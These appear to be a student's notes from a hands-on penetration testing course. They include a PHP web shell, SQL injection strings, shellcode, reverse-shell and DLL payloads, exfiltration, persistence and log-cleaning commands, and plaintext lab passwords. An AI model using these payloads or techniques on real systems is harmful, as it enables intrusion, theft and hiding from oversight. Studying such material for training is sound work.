USER: SESA-005-M
PW: 3fGsPLvqbwPTrtU
HOSTMACHINE 14 : 10.50.23.41

Linux OPStation Float IP: 10.50.32.253  IP: 192.168.65.10
instances, linopd
Windows OPStation Float IP: 10.50.38.37 IP: 192.168.65.20

DAY 1 ### PENETRATION TESTING ###
Types of PEN TESTING
Blackhat Penetration test
- No information
Whitehat Penetration test
- Start off with some information 

Penetration Test Reporting
Mission Definition (Phase 1)
- Define mission goals and targets
- Determine scope of mission (What is the purpose for this mission)
- Define RoE (Proper Engagement on targets/Legal)

Recon (Phase 2)
- Information gathering about the target through public sources
- Phishing attempts ( Unit/Company employers) 

Footprinting (Phase 3)
- Accumlate data through scanning and/or interaction with the target/target resources
- Scanning to see what hosts are up
- Nmap scans 

Exploitation and Inital Access (Phase 4)
- Gain an inital foothold on network
- check if port is what it says it is
- check websites for jump into

Post-Exploitation (Phase 5)
- Establish persistance
- Escalate privileges
- Cover your tracks
- Exfiltrate target data (PII or Money Investment stuff)

Document Mission (Phase 6)
Operation Notes
- To backtrack information you've already covered
- To make reporting after action reports easier
- To cover you bases easier with opnotes 

Penetration Test Reporting 
Executive Summary
hitting wavetops for CO type. just plan of action
Technical Summary
for SME who are on the team for the mission, What we need to do 

Penetration Test Reporting
Reasons to report
- let your employer in the loop of their networks 
What to report
- Malware or anything suspicious/
Screen captures
- Make sure opnotes are easy to read to pass onto next shift

Scanning and Reconnisance
Documentation
- Important for informing teammates, Tracking What you did
Collection and Use
- Collect anything that can be used 
Limitations and Collections
- Listen to ROE and lateral limits/legal team 


Data to Collect
Web Data
- Cached Content, Analytics
Sensitive Data
- Business Data, Profiles, Business Filings 
Publicly Accessible
Physical Addresses, Phone Numbers, Email Address, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
Social Media
Twitter, Facebok, Instagram, People Searches, Registry and Wish List
Domain And IP Data
DNS Registration, IP Address Assignments, Geolocation Data, Whois

HTML Demo 

Advanced Scanning Techniques Demos 

Script Management
located in /usr/share/nmap/scripts

Google "Hack"
site:marines.mil
- Shows only websites with marines.mil
site:marines.mil <keyword>
site:marines.mil filetype:pdf "<Keyword>"

Vulnerability and Exploitation Research
- Transition from Recon to Weaponization
Research
- Open Source 
- See what available plan of action you have
Capabilities
- Mission Objectives drive requirements
   o Collection
   o Effects
- Additional functionality to fufill requirements 
- COMSEC (Make sure you are securing tech and communication between teams)
Testing
- Test in a sandbox environment
Plan
- Procure Hardware and Software
- Assign developer
- Assign a tester to develop TTPs and break it
- Document testing results
- testing environment

Wbsite to use for activities 
exploit-db.com
virustotal
-Don't Trust too much into it

for i in {96..128}; do proxychains nc -nvzw1 192.168.NetID.$i 22 53 80 135 137 139 445 2>&1 | grep OK | grep -Eo "192.168.NetID.:[0-9]" ;done

for i in {224..255}; do proxychainsnc -nvzwl 192.168.150.$i 1-1024 2>&1 | grep OK | grep -Eo "192.168.150.:[0-9]";done




DAY 2 and 3 ### WEB EXPLOITATION ###
Server/Client Relationship
- Server provides services 
- Client requests services 
- a Server can also be a client

HTTP Protocol
GET / Recieves information
POST / Sends information to web server
HEAD /
PUT /

HTTP Response Codes
10X == Informational
2XX == Success 
30X == Redirection
4XX == Client Error
5XX == Server Error

HTTP Packet Headers 
F12 and use the network tab 
HTTP Fields
- User-Agent
- Referer 
- Cookie
- Date
- Server 
- Set-Cookie

Wget
- Recursively download
- Recover from broken transfers
- SSL/TLS support
cURL
- Non recursive
- Can use pipes
- Upload ability
- Supports more protocols vs wget, such as scp and POP3

HTML is a framework for a website

JavaScript is able to change features on website

Enumeration 
robots.txt

nmap -v -sT -T5 --script http.enum.nse 10.50.31.75 shows (if robots.txt exist in website, also enumerates directories to find interesting events)

sudo apt install nikto -y (to get nikto)
nikto -h 10.50.31.75 **** Gives us information faster than other enumeration tools

Cross-Site Scripting
Client goes to trusted website, but website is compromised from JavaScript and since the client "trust" the website, the JavaScript can run on Client
Reflected XSS 
Is on the URL and is encoded with base64 or illegal URL characters
Stored XSS
Is in the server of the website, If client logs in exectuable will run

Server-Side injection

Directory Traversal/Path Traversal
Ability to read/execute outside web server’s directory
Uses ../../ (relative paths) in manipulating a server-side file path
view_image.php?file=../../etc/passwd
Use ; to run commands
; ls 
; whoami
; cat ../../../../etc/passwd
; cat ../../../../etc/hosts
; cat ../../../../etc/profiles (can run without root privs)

you can do more than simple commands on directory Traversal but it doesn't save changes unless its a key
; pwd (check current directory)
; ls /home (check common area for users on server)
; ls /home/* ( check any interesting locations)
; cat /home/* ( cat the interesting location to see if it is valuable)

Malicious File upload

Open a notepad to create a .php with
<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>

save as a .php

upload .php file, navigate back to uploads

gives command shell on the text bar 
- cat /etc/passwd
whoami dictates where you put the public rsa key in

Command Injection
Create ssh key
ssh-keygen -t rsa 
Generating public/private rsa key pair.

Grab public Key
student@lin-ops:~$ cd ~/.ssh
student@lin-ops:~/.ssh$ cat id_rsa.pub

find users home directory 
; cat /etc/passwd

Create directory for .ssh key 
; mkdir var/www/.ssh ( the . in ssh makes it invisible to directories ) 

echo ssh onto authorized keys
echo "key" >> /var/www/.ssh/authorized_keys

try ssh process again for test if it doesn't work

Training Webstie: 10.100.28.55
SQL Commands

show tables from session;
- shows table format of session
select * from session.car;
- shows everything from the car table in the session table

Union needs an even amount of columns to from both tables in order to work
Example: Car has 5 columns and inside the cars table it has tires with 3 column, you need to pad 2 extra columns in order for SQL to print
SELECT * FROM car UNION SELECT tireid,name,size,cost,1,2 FROM Tires;


 TOM' OR 1='1 (trying to probe SQL for information about it system)
if statement is true will return everything
Situationsal awareness
ps -ef ( shows processes )


' is unsanitized and will determine how vulnerable the SQL you are testing is.

Stacking Statements

Chaining multiple statements together using a semi-colon ;


SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
Nesting statements


Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.


Though they may allow for nesting a statement within an existing one:


php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
Ignore the rest

Using # or -- tells the Database to ignore everything after


Server-Side Query:

SELECT product FROM item WHERE id = $select limit 1;


Input to Inject:

1 or 1=1; #


Stacking Statements
Chaining multiple statements together using a semi-colon ; 
SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’

Using # or -- tells the Database to ignore everything after

@@version shows version on GET request (Might be on the test)

REVERSE ENGINEERING
registers hold values for certain datasets
general register tells you where the stuff you need is
stack holds all registers
heap allocates space 

X86_64 Assembly - Common Instruction Pointer
MOV
move source to destination
PUSH
push source onto stack
POP
Pop top of stack to destination
INC
Increment source by 1
DEC
Decrement source by 1
ADD
Add source to destination
SUB
Subtract source from destination
CMP•••••••••••••••
Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
JMP
Jump to specified location
JLE
Jump if less than or equal
JE	
Jump if equal
JNZ
Jump if not zero (if)


Static

Behavioral

Dynamic

Disassembly

Document Findings

Furthest on the right move to the most left value to compare 


to change conditions, right-click conditional and use patch button
you can change the value or the pointer, you have to export the newly packed file in order to see changes in program


for finding the right answer when it comes to executables, you can save files while a program is running, 

Gildra Notes
- you can find the location of the file/file specifed in loop by clicking on the absolute path in the right side
- the & symbol means saved in program, check the DAT's for value specified

DAY 4 ###EXPLOIT DEVELOPMENT###

gdb-peda
run
info functions
pdisass main (looks at main function)
pdisass getuserinput (can look for vulernable functions in function)

wiremask buffer overflow pattern
gdb ./func
run <<< $(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")



env - gdb ./func
show env 
unset env COLUMNS/LINES
run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
info proc map

find /b (start of HEAP to end of Stack) 0x56558000, 0xffffe000, 0xff(JMP), 0xe4(ESP)

find address put in script

0x56555683
0x56556683

invert the registers for the payload

Create Payload
msfvenom -p linux/x86/exec CMD=ifconfig -b '\x80' -f python

put payload in script

# assist with encoding NOP SLED
  buf +="\x90" * 10

# Shell Code / Payload below
# msfvenom -p linux/x86/exec CMD=ifconfig -b '\x80' -f python

  buf += b"\xdb\xc1\xd9\x74\x24\xf4\x5a\xbe\x25\xcb\x13\x0e"
  buf += b"\x33\xc9\xb1\x0c\x31\x72\x17\x03\x72\x17\x83\xe7"
  buf += b"\xcf\xf1\xfb\x8d\xc4\xad\x9a\x03\xbd\x25\xb0\xc0"





set CMD whoami && ifconfig


buf += b"\xbe\xc5\x93\x20\xc6\xd9\xf7\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x11\x31\x70\x12\x03\x70\x12\x83\x05"
buf += b"\x97\xc2\x33\xef\x93\x5a\x25\xbd\xc5\x32\x78\x22"
buf += b"\x83\x24\xea\x8b\xe0\xc2\xeb\xbb\x29\x71\x85\x55"
buf += b"\xbf\x96\x07\x41\xa2\x58\xa8\x91\xbe\x39\xdc\xb1"
buf += b"\x6f\x94\x6f\xd4\x0c\x9a\xea\x62\xfc\x74\x83\xef"
buf += b"\x70\xf0\x18\x8a\x17\x70\xba\x20\xf6\x04\x20\xaa"
buf += b"\x06\xb2\xfb\xa3\xe6\xf1\x7c"


Windows Buffer Overflow
get VulnSever and essfunc.dll




Create Script with socket input

Open Immunity debugger to see rhe vulnserver exploit 

grab wiremask overflow pattern 

look at the cpu window to grab the eip to find the buffer overflow offset

!mona modules
- Gives addresses for .dll or Modules
!mona jmp -r esp -m
- Gives addresses for JMP ESP 

NO OP Sled "\x90" * 15
msfvenom a payload

set up multihandler
use mulyi/handler

LHOST 0.0.0.0
LPORT 4444

turn off anti virus (realtime protection)

change to quad 0's for host and local port to the desired machine after you make a tunnel to the target from the jumpbox 

DAY 5 ###POST EXPLOITATION###
SSH Info
- Can run commands from home terminal without fully logging on
EX: ssh student@<IP> ls -lisa
-X uses all programs, -Y uses trusted programs

Windows Target
- netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
- netsh interface portproxy show all
- netsh interface portproxy delete v4tov4 listenport=<LocalPort>
- netsh interface portproxy reset

If found private key can use -i to authenticate 
- chmod 600 /home/student/stolenkey
- ssh -i /home/student/stolenkey jane@1.2.3.4

Control Sockets 
-M, -S
ssh -MS /tmp/gray student@<IP> (to create Control Socket)
ssh -S /tmp/gray <placeholder> takes us to the tmp directory of the jump box

To cancel a socket use 
ssh -MS /tmp/gray -O cancel student@<IP>

To create a port forward with socket
ssh -S /tmp/gray dummy -O forward -L7777:192.168.x.x:80

Can create a Dynamic Tunnel with Control sockets
ssh -S /tmp/gray dummy -O forward

Local Host Enumeration 
User Enumeration (looking for users)
- net user ( Windows ) 
- cat /etc/password ( Linux )
- id ( Windows ) 
- whoami ( Linux )
Process Enumeration
- tasklist /v ( Windows )
- ps -elf ( Linux )
Service Enumeration
- tasklist /svc ( Windows )
- chkconfig                  #SysV              ( Linux )
  systemctl --type=service   #SystemD           ( Linux )
Data Exfiltration
- type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out ( Windows ) 
- certutil -encode <file> encoded.b64

- cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt ( Linux )
- cat <file>> | base64

Try pinging to machine if scp doesn't work

150.245

www-data@extranet:~$ ssh -i .ssh/id_rsa comrade@192.168.150.253 -p 3201

192.168.150.253 Donovian-Intranet
proxychains nc 192.168.150.253 3201
192.168.150.253 port 514 (syslog is open)

root priv



relating to all network items, name resolution
cat /etc/hosts
relating to rsyslog or syslog 
cat /etc/rsyslog.d/50-default.conf 
relating to securtiy products on linux ( google linux security products )
cat /etc/rkhunter.conf
relating to the users on this system.
cat /etc/shadow


comrade::StudentMidwayPassword

create a bpf to block tcp track and use a netcat listener with wireshark to find the answer?

looking for malicious malware you will have to check other users home directory with sudo ls 
EX sudo ls /root ->



DAY 6 ### PRIVILIGE ESCALATION ###
Windows
Privilige escalation is user, integrity-level elevation is programs with certain privileges

Windows Access Control Model
- Access Tokens 
   o Security IDentifier (SID) associations and Token associations
- Security Descriptors
   o DACL
   o SACL
   o ACEs

DLL Search Order
Executables check the following locations (in successive order):
- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
- The directory the the Application was run from
-  The directory specified in in the C+ function GetSystemDirectory()
- The directory specified in the C+ function GetWindowsDirectory()
- The current directory

Windows Integrity Level
Untrusted = Anonymous SID access tokens
Low = Everyone SID access token (world)
Medium = Autheniated Users
High = Administrators
System = System services (LocalSystem, LocalService, NetworkService)

sysinternals
PS C:> sigcheck -m <absolute filepath>
PS C:> sigcheck <absolute filepath> gives File information 
icacls "<Directory Location>" shows running permissions 
User Account Control (UAC)
Gives the ability to run commands as admin (sudo)
- Always Notify
- Only when making changes 
- Nerver Notify

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

Scheduled Task and Services
Items to evaluate include:
- Write Permissions ( able to write and save changes )
- Non-Standard Locations 
- Unquoted Executable Paths ( you can put an executable in the path is NOT quoted )
- Vulnerabilites in Executables ( if Risk exsist it is vulnerable )
- Permission to Run As SYSTEM

schtasks /query /fo LIST /v | select-string -Pattern "Task to Run" -CaseSensitive | select-String -pattern "COM handler" -NotMatch

Create a .DLL in Metasploit with a desired shell code and send it into the desired directory for the privilige escalation
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
scp student@10.50.X.X:/home/student/SSPICLI.dll C:\users\DemoAdmin

Filter by Description to see if there are any missing "pieces" to the tasks EX: a service with no description and with an automatic start time
- you can also use the GUI to see if you have priviliges in a certain directory with right clicking

msfvenom -p windows/shell_reverse_tcp LHOST=10.50.21.212 LPORT=12345 -f exe > 7z.exe
send payload to the windows machine 
setup nc on the linux and you should have your windows on your linux machine

Setting up Persistance 
Survives:
- Reboots
- Credential changes 
- DHCP IP reassignment
- etc
Considerations:
- File naming
- File location
- Timestomping
- Port selection
- name conventions

persistance Keys
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
- Run( everytime a machine or user starts up )
- RunOnce( only runs once after a machine/user is booted up )

Covering Tracks 
- Where will logs be set if I run a command 
- Hide File locations, names, times 
- Know the naming conventions and try to replicate how the target sets up thier stuff
- Artifacts 
   o Event Logs ( Applications, Security, Setup, System )

Important Microsoft Event IDs
4624/4625       Successful/failed login
4720            Account created
4672            Administrative user logged on
7045            Service created

DAY 7 ### PRIVILEGE ESCALATION LINUX ###

Sudo -l 
Enumerationg For Privilege Escalation

Physical Access = Keys to the kingdom

World-writable Files are in the tmp directory
SUDO
 https://gtfobins.github.io/
sudo apt-get changelog apt

LFILE=file_to_read
./cat "$LFILE"

SUID/SGID
find / -type f -perm /4000 -ls 2>/dev/null
-4000 is SUID Users 
-2000 is SGID
-6000 is SUID or SGID 

find . -exec cat /etc/shadow

cat crontab
find / -type f -writable -o -type -d -writable 2>/dev/nulll

Dot '.' in PATH
echo $PATH
- shows full paths

Vulnerable Softeare and Services 
use schtasks /etc/crontabs
ps aux | grep root

Unpatched Kernel Vulnerabilites 
uname -a
cat /proc/version
dmesg | grep Linux

https://dirtycow.ninja/

Cron Job 
put any command to run at a certain time for persistance

Kernel Module Backdoors
you need the right version for the Kernel to run 

Covering Your Tracks
- Know what logs you leave and which ones to delete
- Artifacts are also things you leave on the targeted machine 
- Know the limits of the machine ( how much RAM a machine has compared to what you are asking the machine to do )
- unset HISTFILE 

ls -latr /proc/1/exe
stat /sbin/init
man init
init --version
ps 1

Auditing SystemV
ausearch: Pulls from audit.log
- ausearch -p 22
- ausearch -m USER_LOGIN -sv no
- ausearch -ua edwards -ts yesterday -te now -i

SystemD
Utilzes journalctl
- journalctl _TRANSPORT=audit
- journalctl _TRANSPORT=audit | grep 603

Logs for Covering tracks
auth.log/secure    Logins/authentications
lastlog            Each users' last successful login time
btmp               bad login attempts
sulog              Usage of SU command
utmp               Currently logged in users (W command)
wtmp               Permanent record on user on/off

Cleaning logs 

Timestomp with *NIX
touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference

Remote Logging
rsyslog > config file tells more information

/etc/rsyslog.d/*
/etc/rsyslog.conf

grep "IncludeConfig" /etc/rsyslog.conf
<facility>.<Priority>

172.16.4.6 from port 31627

line 601 is the masked


traget box
10.50.22.50

Plug into Url for info
/login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1



user2
RntyrfVfNER78
user3
Obo4GURRnccyrf
Lee_Roth
anotherpassword4THEages


DRYRUN REVIEW
For Linux
 for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

For Windows
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up


SQL injection
UNION SELECT 1,table_name,3 FROM information_schema.tables
UNION SELECT 1,table_schema,table_name FROM information_schema.tables
UNION SELECT table_name,1,column_name FROM information_schema.columns
UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
EX: UNION SELECT userid,username,passwd FROM users

Tables are one compared to columns which have multiple selections in one choice 






































